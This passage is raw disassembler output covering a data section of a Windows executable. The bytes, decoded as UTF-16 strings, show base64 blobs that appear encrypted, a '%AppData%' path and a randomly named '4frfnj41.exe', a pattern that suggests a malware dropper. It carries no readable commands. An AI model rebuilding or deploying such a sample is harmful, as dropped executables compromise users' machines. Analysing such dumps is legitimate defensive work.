  409656:	00 4a 00             	add    %cl,0x0(%edx)
  409659:	44                   	inc    %esp
  40965a:	00 32                	add    %dh,(%edx)
  40965c:	00 30                	add    %dh,(%eax)
  40965e:	00 43 00             	add    %al,0x0(%ebx)
  409661:	4a                   	dec    %edx
  409662:	00 59 00             	add    %bl,0x0(%ecx)
  409665:	31 00                	xor    %eax,(%eax)
  409667:	51                   	push   %ecx
  409668:	00 61 00             	add    %ah,0x0(%ecx)
  40966b:	4b                   	dec    %ebx
  40966c:	00 6a 00             	add    %ch,0x0(%edx)
  40966f:	79 00                	jns    0x409671
  409671:	4b                   	dec    %ebx
  409672:	00 71 00             	add    %dh,0x0(%ecx)
  409675:	6a 00                	push   $0x0
  409677:	55                   	push   %ebp
  409678:	00 56 00             	add    %dl,0x0(%esi)
  40967b:	78 00                	js     0x40967d
  40967d:	41                   	inc    %ecx
  40967e:	00 6f 00             	add    %ch,0x0(%edi)
  409681:	5a                   	pop    %edx
  409682:	00 69 00             	add    %ch,0x0(%ecx)
  409685:	67 00 41 00          	add    %al,0x0(%bx,%di)
  409689:	64 00 59 00          	add    %bl,%fs:0x0(%ecx)
  40968d:	61                   	popa
  40968e:	00 58 00             	add    %bl,0x0(%eax)
  409691:	79 00                	jns    0x409693
  409693:	42                   	inc    %edx
  409694:	00 4b 00             	add    %cl,0x0(%ebx)
  409697:	77 00                	ja     0x409699
  409699:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40969e:	81 59 50 00 43 00 59 	sbbl   $0x59004300,0x50(%ecx)
  4096a5:	00 72 00             	add    %dh,0x0(%edx)
  4096a8:	45                   	inc    %ebp
  4096a9:	00 6d 00             	add    %ch,0x0(%ebp)
  4096ac:	68 00 6b 00 31       	push   $0x31006b00
  4096b1:	00 54 00 59          	add    %dl,0x59(%eax,%eax,1)
  4096b5:	00 42 00             	add    %al,0x0(%edx)
  4096b8:	72 00                	jb     0x4096ba
  4096ba:	71 00                	jno    0x4096bc
  4096bc:	72 00                	jb     0x4096be
  4096be:	7a 00                	jp     0x4096c0
  4096c0:	35 00 4e 00 63       	xor    $0x63004e00,%eax
  4096c5:	00 76 00             	add    %dh,0x0(%esi)
  4096c8:	30 00                	xor    %al,(%eax)
  4096ca:	33 00                	xor    (%eax),%eax
  4096cc:	33 00                	xor    (%eax),%eax
  4096ce:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
  4096d2:	69 00 59 00 51 00    	imul   $0x510059,(%eax),%eax
  4096d8:	41                   	inc    %ecx
  4096d9:	00 39                	add    %bh,(%ecx)
  4096db:	00 52 00             	add    %dl,0x0(%edx)
  4096de:	37                   	aaa
  4096df:	00 41 00             	add    %al,0x0(%ecx)
  4096e2:	5a                   	pop    %edx
  4096e3:	00 74 00 36          	add    %dh,0x36(%eax,%eax,1)
  4096e7:	00 78 00             	add    %bh,0x0(%eax)
  4096ea:	39 00                	cmp    %eax,(%eax)
  4096ec:	73 00                	jae    0x4096ee
  4096ee:	78 00                	js     0x4096f0
  4096f0:	47                   	inc    %edi
  4096f1:	00 70 00             	add    %dh,0x0(%eax)
  4096f4:	70 00                	jo     0x4096f6
  4096f6:	53                   	push   %ebx
  4096f7:	00 50 00             	add    %dl,0x0(%eax)
  4096fa:	39 00                	cmp    %eax,(%eax)
  4096fc:	49                   	dec    %ecx
  4096fd:	00 48 00             	add    %cl,0x0(%eax)
  409700:	4d                   	dec    %ebp
  409701:	00 70 00             	add    %dh,0x0(%eax)
  409704:	59                   	pop    %ecx
  409705:	00 71 00             	add    %dh,0x0(%ecx)
  409708:	4e                   	dec    %esi
  409709:	00 2b                	add    %ch,(%ebx)
  40970b:	00 64 00 30          	add    %ah,0x30(%eax,%eax,1)
  40970f:	00 46 00             	add    %al,0x0(%esi)
  409712:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  409716:	36 00 76 00          	add    %dh,%ss:0x0(%esi)
  40971a:	53                   	push   %ebx
  40971b:	00 2b                	add    %ch,(%ebx)
  40971d:	00 31                	add    %dh,(%ecx)
  40971f:	00 6a 00             	add    %ch,0x0(%edx)
  409722:	6a 00                	push   $0x0
  409724:	4c                   	dec    %esp
  409725:	00 68 00             	add    %ch,0x0(%eax)
  409728:	33 00                	xor    (%eax),%eax
  40972a:	72 00                	jb     0x40972c
  40972c:	52                   	push   %edx
  40972d:	00 79 00             	add    %bh,0x0(%ecx)
  409730:	75 00                	jne    0x409732
  409732:	35 00 32 00 61       	xor    $0x61003200,%eax
  409737:	00 31                	add    %dh,(%ecx)
  409739:	00 6a 00             	add    %ch,0x0(%edx)
  40973c:	47                   	inc    %edi
  40973d:	00 4a 00             	add    %cl,0x0(%edx)
  409740:	59                   	pop    %ecx
  409741:	00 46 00             	add    %al,0x0(%esi)
  409744:	6d                   	insl   (%dx),%es:(%edi)
  409745:	00 59 00             	add    %bl,0x0(%ecx)
  409748:	78 00                	js     0x40974a
  40974a:	66 00 51 00          	data16 add %dl,0x0(%ecx)
  40974e:	73 00                	jae    0x409750
  409750:	48                   	dec    %eax
  409751:	00 71 00             	add    %dh,0x0(%ecx)
  409754:	32 00                	xor    (%eax),%al
  409756:	37                   	aaa
  409757:	00 6e 00             	add    %ch,0x0(%esi)
  40975a:	30 00                	xor    %al,(%eax)
  40975c:	52                   	push   %edx
  40975d:	00 7a 00             	add    %bh,0x0(%edx)
  409760:	49                   	dec    %ecx
  409761:	00 64 00 46          	add    %ah,0x46(%eax,%eax,1)
  409765:	00 65 00             	add    %ah,0x0(%ebp)
  409768:	50                   	push   %eax
  409769:	00 71 00             	add    %dh,0x0(%ecx)
  40976c:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
  409770:	41                   	inc    %ecx
  409771:	00 53 00             	add    %dl,0x0(%ebx)
  409774:	58                   	pop    %eax
  409775:	00 75 00             	add    %dh,0x0(%ebp)
  409778:	5a                   	pop    %edx
  409779:	00 4b 00             	add    %cl,0x0(%ebx)
  40977c:	4b                   	dec    %ebx
  40977d:	00 62 00             	add    %ah,0x0(%edx)
  409780:	47                   	inc    %edi
  409781:	00 31                	add    %dh,(%ecx)
  409783:	00 2f                	add    %ch,(%edi)
  409785:	00 73 00             	add    %dh,0x0(%ebx)
  409788:	7a 00                	jp     0x40978a
  40978a:	54                   	push   %esp
  40978b:	00 51 00             	add    %dl,0x0(%ecx)
  40978e:	66 00 52 00          	data16 add %dl,0x0(%edx)
  409792:	52                   	push   %edx
  409793:	00 46 00             	add    %al,0x0(%esi)
  409796:	34 00                	xor    $0x0,%al
  409798:	6b 00 4f             	imul   $0x4f,(%eax),%eax
  40979b:	00 4e 00             	add    %cl,0x0(%esi)
  40979e:	47                   	inc    %edi
  40979f:	00 33                	add    %dh,(%ebx)
  4097a1:	00 42 00             	add    %al,0x0(%edx)
  4097a4:	6c                   	insb   (%dx),%es:(%edi)
  4097a5:	00 2b                	add    %ch,(%ebx)
  4097a7:	00 50 00             	add    %dl,0x0(%eax)
  4097aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4097ab:	00 67 00             	add    %ah,0x0(%edi)
  4097ae:	48                   	dec    %eax
  4097af:	00 4b 00             	add    %cl,0x0(%ebx)
  4097b2:	62 00                	bound  %eax,(%eax)
  4097b4:	2f                   	das
  4097b5:	00 4a 00             	add    %cl,0x0(%edx)
  4097b8:	76 00                	jbe    0x4097ba
  4097ba:	41                   	inc    %ecx
  4097bb:	00 72 00             	add    %dh,0x0(%edx)
  4097be:	69 00 50 00 4c 00    	imul   $0x4c0050,(%eax),%eax
  4097c4:	56                   	push   %esi
  4097c5:	00 53 00             	add    %dl,0x0(%ebx)
  4097c8:	57                   	push   %edi
  4097c9:	00 55 00             	add    %dl,0x0(%ebp)
  4097cc:	4e                   	dec    %esi
  4097cd:	00 34 00             	add    %dh,(%eax,%eax,1)
  4097d0:	34 00                	xor    $0x0,%al
  4097d2:	55                   	push   %ebp
  4097d3:	00 48 00             	add    %cl,0x0(%eax)
  4097d6:	32 00                	xor    (%eax),%al
  4097d8:	73 00                	jae    0x4097da
  4097da:	52                   	push   %edx
  4097db:	00 76 00             	add    %dh,0x0(%esi)
  4097de:	38 00                	cmp    %al,(%eax)
  4097e0:	39 00                	cmp    %eax,(%eax)
  4097e2:	39 00                	cmp    %eax,(%eax)
  4097e4:	4a                   	dec    %edx
  4097e5:	00 4e 00             	add    %cl,0x0(%esi)
  4097e8:	5a                   	pop    %edx
  4097e9:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
  4097ed:	00 77 00             	add    %dh,0x0(%edi)
  4097f0:	51                   	push   %ecx
  4097f1:	00 2b                	add    %ch,(%ebx)
  4097f3:	00 6b 00             	add    %ch,0x0(%ebx)
  4097f6:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  4097fb:	35 00 52 00 67       	xor    $0x67005200,%eax
  409800:	00 6c 00 66          	add    %ch,0x66(%eax,%eax,1)
  409804:	00 5a 00             	add    %bl,0x0(%edx)
  409807:	63 00                	arpl   %eax,(%eax)
  409809:	4f                   	dec    %edi
  40980a:	00 58 00             	add    %bl,0x0(%eax)
  40980d:	6f                   	outsl  %ds:(%esi),(%dx)
  40980e:	00 48 00             	add    %cl,0x0(%eax)
  409811:	78 00                	js     0x409813
  409813:	68 00 6d 00 64       	push   $0x64006d00
  409818:	00 59 00             	add    %bl,0x0(%ecx)
  40981b:	79 00                	jns    0x40981d
  40981d:	2b 00                	sub    (%eax),%eax
  40981f:	71 00                	jno    0x409821
  409821:	53                   	push   %ebx
  409822:	00 78 00             	add    %bh,0x0(%eax)
  409825:	5a                   	pop    %edx
  409826:	00 4f 00             	add    %cl,0x0(%edi)
  409829:	33 00                	xor    (%eax),%eax
  40982b:	31 00                	xor    %eax,(%eax)
  40982d:	44                   	inc    %esp
  40982e:	00 36                	add    %dh,(%esi)
  409830:	00 64 00 44          	add    %ah,0x44(%eax,%eax,1)
  409834:	00 39                	add    %bh,(%ecx)
  409836:	00 49 00             	add    %cl,0x0(%ecx)
  409839:	6d                   	insl   (%dx),%es:(%edi)
  40983a:	00 70 00             	add    %dh,0x0(%eax)
  40983d:	46                   	inc    %esi
  40983e:	00 4a 00             	add    %cl,0x0(%edx)
  409841:	2b 00                	sub    (%eax),%eax
  409843:	4f                   	dec    %edi
  409844:	00 69 00             	add    %ch,0x0(%ecx)
  409847:	43                   	inc    %ebx
  409848:	00 68 00             	add    %ch,0x0(%eax)
  40984b:	31 00                	xor    %eax,(%eax)
  40984d:	45                   	inc    %ebp
  40984e:	00 67 00             	add    %ah,0x0(%edi)
  409851:	38 00                	cmp    %al,(%eax)
  409853:	36 00 2b             	add    %ch,%ss:(%ebx)
  409856:	00 6b 00             	add    %ch,0x0(%ebx)
  409859:	52                   	push   %edx
  40985a:	00 39                	add    %bh,(%ecx)
  40985c:	00 39                	add    %bh,(%ecx)
  40985e:	00 48 00             	add    %cl,0x0(%eax)
  409861:	47                   	inc    %edi
  409862:	00 6b 00             	add    %ch,0x0(%ebx)
  409865:	48                   	dec    %eax
  409866:	00 67 00             	add    %ah,0x0(%edi)
  409869:	68 00 63 00 64       	push   $0x64006300
  40986e:	00 4b 00             	add    %cl,0x0(%ebx)
  409871:	6a 00                	push   $0x0
  409873:	58                   	pop    %eax
  409874:	00 42 00             	add    %al,0x0(%edx)
  409877:	66 00 6b 00          	data16 add %ch,0x0(%ebx)
  40987b:	34 00                	xor    $0x0,%al
  40987d:	39 00                	cmp    %eax,(%eax)
  40987f:	62 00                	bound  %eax,(%eax)
  409881:	45                   	inc    %ebp
  409882:	00 67 00             	add    %ah,0x0(%edi)
  409885:	41                   	inc    %ecx
  409886:	00 47 00             	add    %al,0x0(%edi)
  409889:	69 00 46 00 43 00    	imul   $0x430046,(%eax),%eax
  40988f:	7a 00                	jp     0x409891
  409891:	53                   	push   %ebx
  409892:	00 62 00             	add    %ah,0x0(%edx)
  409895:	32 00                	xor    (%eax),%al
  409897:	6b 00 51             	imul   $0x51,(%eax),%eax
  40989a:	00 38                	add    %bh,(%eax)
  40989c:	00 67 00             	add    %ah,0x0(%edi)
  40989f:	61                   	popa
  4098a0:	00 37                	add    %dh,(%edi)
  4098a2:	00 34 00             	add    %dh,(%eax,%eax,1)
  4098a5:	67 00 3d             	add    %bh,(%di)
  4098a8:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  4098ae:	42                   	inc    %edx
  4098af:	00 63 00             	add    %ah,0x0(%ebx)
  4098b2:	77 00                	ja     0x4098b4
  4098b4:	45                   	inc    %ebp
  4098b5:	00 6e 00             	add    %ch,0x0(%esi)
  4098b8:	68 00 6d 00 71       	push   $0x71006d00
  4098bd:	00 65 00             	add    %ah,0x0(%ebp)
  4098c0:	46                   	inc    %esi
  4098c1:	00 50 00             	add    %dl,0x0(%eax)
  4098c4:	47                   	inc    %edi
  4098c5:	00 4e 00             	add    %cl,0x0(%esi)
  4098c8:	73 00                	jae    0x4098ca
  4098ca:	52                   	push   %edx
  4098cb:	00 6b 00             	add    %ch,0x0(%ebx)
  4098ce:	56                   	push   %esi
  4098cf:	00 36                	add    %dh,(%esi)
  4098d1:	00 59 00             	add    %bl,0x0(%ecx)
  4098d4:	7a 00                	jp     0x4098d6
  4098d6:	42                   	inc    %edx
  4098d7:	00 38                	add    %bh,(%eax)
  4098d9:	00 65 00             	add    %ah,0x0(%ebp)
  4098dc:	78 00                	js     0x4098de
  4098de:	37                   	aaa
  4098df:	00 2f                	add    %ch,(%edi)
  4098e1:	00 55 00             	add    %dl,0x0(%ebp)
  4098e4:	4b                   	dec    %ebx
  4098e5:	00 59 00             	add    %bl,0x0(%ecx)
  4098e8:	79 00                	jns    0x4098ea
  4098ea:	33 00                	xor    (%eax),%eax
  4098ec:	5a                   	pop    %edx
  4098ed:	00 50 00             	add    %dl,0x0(%eax)
  4098f0:	46                   	inc    %esi
  4098f1:	00 4a 00             	add    %cl,0x0(%edx)
  4098f4:	79 00                	jns    0x4098f6
  4098f6:	53                   	push   %ebx
  4098f7:	00 4f 00             	add    %cl,0x0(%edi)
  4098fa:	2f                   	das
  4098fb:	00 44 00 51          	add    %al,0x51(%eax,%eax,1)
  4098ff:	00 43 00             	add    %al,0x0(%ebx)
  409902:	67 00 59 00          	add    %bl,0x0(%bx,%di)
  409906:	69 00 4b 00 38 00    	imul   $0x38004b,(%eax),%eax
  40990c:	79 00                	jns    0x40990e
  40990e:	6a 00                	push   $0x0
  409910:	56                   	push   %esi
  409911:	00 6a 00             	add    %ch,0x0(%edx)
  409914:	48                   	dec    %eax
  409915:	00 63 00             	add    %ah,0x0(%ebx)
  409918:	2f                   	das
  409919:	00 63 00             	add    %ah,0x0(%ebx)
  40991c:	57                   	push   %edi
  40991d:	00 66 00             	add    %ah,0x0(%esi)
  409920:	30 00                	xor    %al,(%eax)
  409922:	62 00                	bound  %eax,(%eax)
  409924:	36 00 62 00          	add    %ah,%ss:0x0(%edx)
  409928:	4c                   	dec    %esp
  409929:	00 48 00             	add    %cl,0x0(%eax)
  40992c:	42                   	inc    %edx
  40992d:	00 47 00             	add    %al,0x0(%edi)
  409930:	66 00 2f             	data16 add %ch,(%edi)
  409933:	00 39                	add    %bh,(%ecx)
  409935:	00 7a 00             	add    %bh,0x0(%edx)
  409938:	59                   	pop    %ecx
  409939:	00 77 00             	add    %dh,0x0(%edi)
  40993c:	53                   	push   %ebx
  40993d:	00 46 00             	add    %al,0x0(%esi)
  409940:	43                   	inc    %ebx
  409941:	00 62 00             	add    %ah,0x0(%edx)
  409944:	71 00                	jno    0x409946
  409946:	71 00                	jno    0x409948
  409948:	79 00                	jns    0x40994a
  40994a:	74 00                	je     0x40994c
  40994c:	66 00 6e 00          	data16 add %ch,0x0(%esi)
  409950:	4c                   	dec    %esp
  409951:	00 50 00             	add    %dl,0x0(%eax)
  409954:	57                   	push   %edi
  409955:	00 67 00             	add    %ah,0x0(%edi)
  409958:	67 00 3d             	add    %bh,(%di)
  40995b:	00 3d 00 00 13 25    	add    %bh,0x25130000
  409961:	00 41 00             	add    %al,0x0(%ecx)
  409964:	70 00                	jo     0x409966
  409966:	70 00                	jo     0x409968
  409968:	44                   	inc    %esp
  409969:	00 61 00             	add    %ah,0x0(%ecx)
  40996c:	74 00                	je     0x40996e
  40996e:	61                   	popa
  40996f:	00 25 00 00 19 34    	add    %ah,0x34190000
  409975:	00 66 00             	add    %ah,0x0(%esi)
  409978:	72 00                	jb     0x40997a
  40997a:	66 00 6e 00          	data16 add %ch,0x0(%esi)
  40997e:	6a 00                	push   $0x0
  409980:	34 00                	xor    $0x0,%al
  409982:	31 00                	xor    %eax,(%eax)
  409984:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  409988:	78 00                	js     0x40998a
  40998a:	65 00 00             	add    %al,%gs:(%eax)
  40998d:	59                   	pop    %ecx
  40998e:	52                   	push   %edx
  40998f:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
  409993:	00 59 00             	add    %bl,0x0(%ecx)
  409996:	61                   	popa
  409997:	00 47 00             	add    %al,0x0(%edi)
  40999a:	56                   	push   %esi
  40999b:	00 44 00 54          	add    %al,0x54(%eax,%eax,1)
  40999f:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
  4099a3:	00 78 00             	add    %bh,0x0(%eax)
  4099a6:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
  4099aa:	52                   	push   %edx
  4099ab:	00 31                	add    %dh,(%ecx)
  4099ad:	00 4e 00             	add    %cl,0x0(%esi)
  4099b0:	58                   	pop    %eax
  4099b1:	00 4a 00             	add    %cl,0x0(%edx)
  4099b4:	71 00                	jno    0x4099b6
  4099b6:	5a                   	pop    %edx
  4099b7:	00 6a 00             	add    %ch,0x0(%edx)
  4099ba:	4e                   	dec    %esi
  4099bb:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
  4099bf:	00 55 00             	add    %dl,0x0(%ebp)
  4099c2:	4e                   	dec    %esi
  4099c3:	00 47 00             	add    %al,0x0(%edi)
  4099c6:	5a                   	pop    %edx
  4099c7:	00 55 00             	add    %dl,0x0(%ebp)
  4099ca:	67 00 7a 00          	add    %bh,0x0(%bp,%si)
  4099ce:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  4099d2:	6b 00 32             	imul   $0x32,(%eax),%eax
  4099d5:	00 51 00             	add    %dl,0x0(%ecx)
  4099d8:	6a 00                	push   $0x0
  4099da:	5a                   	pop    %edx
  4099db:	00 69 00             	add    %ch,0x0(%ecx)
  4099de:	63 00                	arpl   %eax,(%eax)
  4099e0:	48                   	dec    %eax
  4099e1:	00 59 00             	add    %bl,0x0(%ecx)
  4099e4:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  4099e9:	38 00                	cmp    %al,(%eax)
  4099eb:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
  4099ef:	37                   	aaa
  4099f0:	00 74 00 7a          	add    %dh,0x7a(%eax,%eax,1)
  4099f4:	00 68 00             	add    %ch,0x0(%eax)
  4099f7:	41                   	inc    %ecx
  4099f8:	00 62 00             	add    %ah,0x0(%edx)
  4099fb:	2f                   	das
  4099fc:	00 6f 00             	add    %ch,0x0(%edi)
  4099ff:	74 00                	je     0x409a01
  409a01:	46                   	inc    %esi
  409a02:	00 39                	add    %bh,(%ecx)
  409a04:	00 30                	add    %dh,(%eax)
  409a06:	00 4a 00             	add    %cl,0x0(%edx)
  409a09:	68 00 75 00 32       	push   $0x32007500
  409a0e:	00 31                	add    %dh,(%ecx)
  409a10:	00 6f 00             	add    %ch,0x0(%edi)
  409a13:	55                   	push   %ebp
  409a14:	00 45 00             	add    %al,0x0(%ebp)
  409a17:	4f                   	dec    %edi
  409a18:	00 39                	add    %bh,(%ecx)
  409a1a:	00 35 00 37 00 7a    	add    %dh,0x7a003700
  409a20:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
  409a24:	00 58 00             	add    %bl,0x0(%eax)
  409a27:	69 00 73 00 63 00    	imul   $0x630073,(%eax),%eax
  409a2d:	31 00                	xor    %eax,(%eax)
  409a2f:	6e                   	outsb  %ds:(%esi),(%dx)
  409a30:	00 51 00             	add    %dl,0x0(%ecx)
  409a33:	56                   	push   %esi
  409a34:	00 63 00             	add    %ah,0x0(%ebx)
  409a37:	2f                   	das
  409a38:	00 52 00             	add    %dl,0x0(%edx)
  409a3b:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  409a3f:	78 00                	js     0x409a41
  409a41:	34 00                	xor    $0x0,%al
  409a43:	7a 00                	jp     0x409a45
  409a45:	51                   	push   %ecx
  409a46:	00 46 00             	add    %al,0x0(%esi)
  409a49:	35 00 68 00 74       	xor    $0x74006800,%eax
  409a4e:	00 66 00             	add    %ah,0x0(%esi)
  409a51:	69 00 4d 00 72 00    	imul   $0x72004d,(%eax),%eax
  409a57:	34 00                	xor    $0x0,%al
  409a59:	77 00                	ja     0x409a5b
  409a5b:	47                   	inc    %edi
  409a5c:	00 47 00             	add    %al,0x0(%edi)
  409a5f:	66 00 56 00          	data16 add %dl,0x0(%esi)
  409a63:	4b                   	dec    %ebx
  409a64:	00 62 00             	add    %ah,0x0(%edx)
  409a67:	4b                   	dec    %ebx
  409a68:	00 53 00             	add    %dl,0x0(%ebx)
  409a6b:	66 00 72 00          	data16 add %dh,0x0(%edx)
  409a6f:	6e                   	outsb  %ds:(%esi),(%dx)
  409a70:	00 50 00             	add    %dl,0x0(%eax)
  409a73:	66 00 2f             	data16 add %ch,(%edi)
  409a76:	00 79 00             	add    %bh,0x0(%ecx)
  409a79:	69 00 34 00 4e 00    	imul   $0x4e0034,(%eax),%eax
  409a7f:	51                   	push   %ecx
  409a80:	00 70 00             	add    %dh,0x0(%eax)
  409a83:	5a                   	pop    %edx
  409a84:	00 42 00             	add    %al,0x0(%edx)
  409a87:	73 00                	jae    0x409a89
  409a89:	36 00 33             	add    %dh,%ss:(%ebx)
  409a8c:	00 45 00             	add    %al,0x0(%ebp)
  409a8f:	50                   	push   %eax
  409a90:	00 74 00 51          	add    %dh,0x51(%eax,%eax,1)
  409a94:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  409a9a:	92                   	xchg   %eax,%edx
  409a9b:	59                   	pop    %ecx
  409a9c:	79 00                	jns    0x409a9e
  409a9e:	69 00 4b 00 64 00    	imul   $0x64004b,(%eax),%eax
  409aa4:	75 00                	jne    0x409aa6
  409aa6:	72 00                	jb     0x409aa8
  409aa8:	6d                   	insl   (%dx),%es:(%edi)
  409aa9:	00 43 00             	add    %al,0x0(%ebx)
  409aac:	6e                   	outsb  %ds:(%esi),(%dx)
  409aad:	00 32                	add    %dh,(%edx)
  409aaf:	00 46 00             	add    %al,0x0(%esi)
  409ab2:	42                   	inc    %edx
  409ab3:	00 4b 00             	add    %cl,0x0(%ebx)
  409ab6:	36 00 44 00 4a       	add    %al,%ss:0x4a(%eax,%eax,1)
  409abb:	00 78 00             	add    %bh,0x0(%eax)
  409abe:	6e                   	outsb  %ds:(%esi),(%dx)
  409abf:	00 44 00 7a          	add    %al,0x7a(%eax,%eax,1)
  409ac3:	00 67 00             	add    %ah,0x0(%edi)
  409ac6:	2b 00                	sub    (%eax),%eax
  409ac8:	34 00                	xor    $0x0,%al
  409aca:	77 00                	ja     0x409acc
  409acc:	32 00                	xor    (%eax),%al
  409ace:	70 00                	jo     0x409ad0
  409ad0:	6d                   	insl   (%dx),%es:(%edi)
  409ad1:	00 6d 00             	add    %ch,0x0(%ebp)
  409ad4:	55                   	push   %ebp
  409ad5:	00 52 00             	add    %dl,0x0(%edx)
  409ad8:	4b                   	dec    %ebx
  409ad9:	00 43 00             	add    %al,0x0(%ebx)
  409adc:	39 00                	cmp    %eax,(%eax)
  409ade:	6a 00                	push   $0x0
  409ae0:	47                   	inc    %edi
  409ae1:	00 59 00             	add    %bl,0x0(%ecx)
  409ae4:	72 00                	jb     0x409ae6
  409ae6:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  409aea:	4f                   	dec    %edi
  409aeb:	00 52 00             	add    %dl,0x0(%edx)
  409aee:	46                   	inc    %esi
  409aef:	00 4b 00             	add    %cl,0x0(%ebx)
  409af2:	59                   	pop    %ecx
  409af3:	00 4d 00             	add    %cl,0x0(%ebp)
  409af6:	66 00 34 00          	data16 add %dh,(%eax,%eax,1)
  409afa:	56                   	push   %esi
  409afb:	00 51 00             	add    %dl,0x0(%ecx)
  409afe:	63 00                	arpl   %eax,(%eax)
  409b00:	46                   	inc    %esi
  409b01:	00 74 00 6b          	add    %dh,0x6b(%eax,%eax,1)
  409b05:	00 41 00             	add    %al,0x0(%ecx)
  409b08:	39 00                	cmp    %eax,(%eax)
  409b0a:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  409b0d:	00 49 00             	add    %cl,0x0(%ecx)
  409b10:	4b                   	dec    %ebx
  409b11:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  409b15:	00 55 00             	add    %dl,0x0(%ebp)
  409b18:	55                   	push   %ebp
  409b19:	00 63 00             	add    %ah,0x0(%ebx)
  409b1c:	75 00                	jne    0x409b1e
  409b1e:	59                   	pop    %ecx
  409b1f:	00 78 00             	add    %bh,0x0(%eax)
  409b22:	70 00                	jo     0x409b24
  409b24:	32 00                	xor    (%eax),%al
  409b26:	4e                   	dec    %esi
  409b27:	00 49 00             	add    %cl,0x0(%ecx)
  409b2a:	52                   	push   %edx
  409b2b:	00 4f 00             	add    %cl,0x0(%edi)
  409b2e:	77 00                	ja     0x409b30
  409b30:	66 00 63 00          	data16 add %ah,0x0(%ebx)
  409b34:	79 00                	jns    0x409b36
  409b36:	4f                   	dec    %edi
  409b37:	00 79 00             	add    %bh,0x0(%ecx)
  409b3a:	4e                   	dec    %esi
  409b3b:	00 31                	add    %dh,(%ecx)
  409b3d:	00 33                	add    %dh,(%ebx)
  409b3f:	00 33                	add    %dh,(%ebx)
  409b41:	00 39                	add    %bh,(%ecx)
  409b43:	00 51 00             	add    %dl,0x0(%ecx)
  409b46:	43                   	inc    %ebx
  409b47:	00 43 00             	add    %al,0x0(%ebx)
  409b4a:	57                   	push   %edi
  409b4b:	00 6a 00             	add    %ch,0x0(%edx)
  409b4e:	6e                   	outsb  %ds:(%esi),(%dx)
  409b4f:	00 4d 00             	add    %cl,0x0(%ebp)
  409b52:	69 00 48 00 63 00    	imul   $0x630048,(%eax),%eax
  409b58:	32 00                	xor    (%eax),%al
  409b5a:	62 00                	bound  %eax,(%eax)
  409b5c:	71 00                	jno    0x409b5e
  409b5e:	77 00                	ja     0x409b60
  409b60:	43                   	inc    %ebx
  409b61:	00 32                	add    %dh,(%edx)
  409b63:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
  409b67:	00 4f 00             	add    %cl,0x0(%edi)
  409b6a:	4e                   	dec    %esi
  409b6b:	00 76 00             	add    %dh,0x0(%esi)
  409b6e:	6d                   	insl   (%dx),%es:(%edi)
  409b6f:	00 4a 00             	add    %cl,0x0(%edx)
  409b72:	6e                   	outsb  %ds:(%esi),(%dx)
  409b73:	00 66 00             	add    %ah,0x0(%esi)
  409b76:	63 00                	arpl   %eax,(%eax)
  409b78:	52                   	push   %edx
  409b79:	00 75 00             	add    %dh,0x0(%ebp)
  409b7c:	6c                   	insb   (%dx),%es:(%edi)
  409b7d:	00 65 00             	add    %ah,0x0(%ebp)
  409b80:	4a                   	dec    %edx
  409b81:	00 39                	add    %bh,(%ecx)
  409b83:	00 63 00             	add    %ah,0x0(%ebx)
  409b86:	41                   	inc    %ecx
  409b87:	00 69 00             	add    %ch,0x0(%ecx)
  409b8a:	35 00 47 00 57       	xor    $0x57004700,%eax
  409b8f:	00 33                	add    %dh,(%ebx)
  409b91:	00 65 00             	add    %ah,0x0(%ebp)
  409b94:	62 00                	bound  %eax,(%eax)
  409b96:	53                   	push   %ebx
  409b97:	00 68 00             	add    %ch,0x0(%eax)
  409b9a:	57                   	push   %edi
  409b9b:	00 53 00             	add    %dl,0x0(%ebx)
  409b9e:	45                   	inc    %ebp
  409b9f:	00 31                	add    %dh,(%ecx)
  409ba1:	00 77 00             	add    %dh,0x0(%edi)
  409ba4:	63 00                	arpl   %eax,(%eax)
  409ba6:	70 00                	jo     0x409ba8
  409ba8:	6b 00 7a             	imul   $0x7a,(%eax),%eax
  409bab:	00 4a 00             	add    %cl,0x0(%edx)
  409bae:	6a 00                	push   $0x0
  409bb0:	33 00                	xor    (%eax),%eax
  409bb2:	4f                   	dec    %edi
  409bb3:	00 4f 00             	add    %cl,0x0(%edi)
  409bb6:	41                   	inc    %ecx
  409bb7:	00 73 00             	add    %dh,0x0(%ebx)
  409bba:	47                   	inc    %edi
  409bbb:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
  409bbf:	00 56 00             	add    %dl,0x0(%esi)
  409bc2:	68 00 31 00 41       	push   $0x41003100
  409bc7:	00 4c 00 4a          	add    %cl,0x4a(%eax,%eax,1)
  409bcb:	00 70 00             	add    %dh,0x0(%eax)
  409bce:	56                   	push   %esi
  409bcf:	00 4b 00             	add    %cl,0x0(%ebx)
  409bd2:	48                   	dec    %eax
  409bd3:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  409bd7:	00 70 00             	add    %dh,0x0(%eax)
  409bda:	51                   	push   %ecx
  409bdb:	00 71 00             	add    %dh,0x0(%ecx)
  409bde:	44                   	inc    %esp
  409bdf:	00 79 00             	add    %bh,0x0(%ecx)
  409be2:	45                   	inc    %ebp
  409be3:	00 55 00             	add    %dl,0x0(%ebp)
  409be6:	57                   	push   %edi
  409be7:	00 69 00             	add    %ch,0x0(%ecx)
  409bea:	58                   	pop    %eax
  409beb:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
  409bef:	00 78 00             	add    %bh,0x0(%eax)
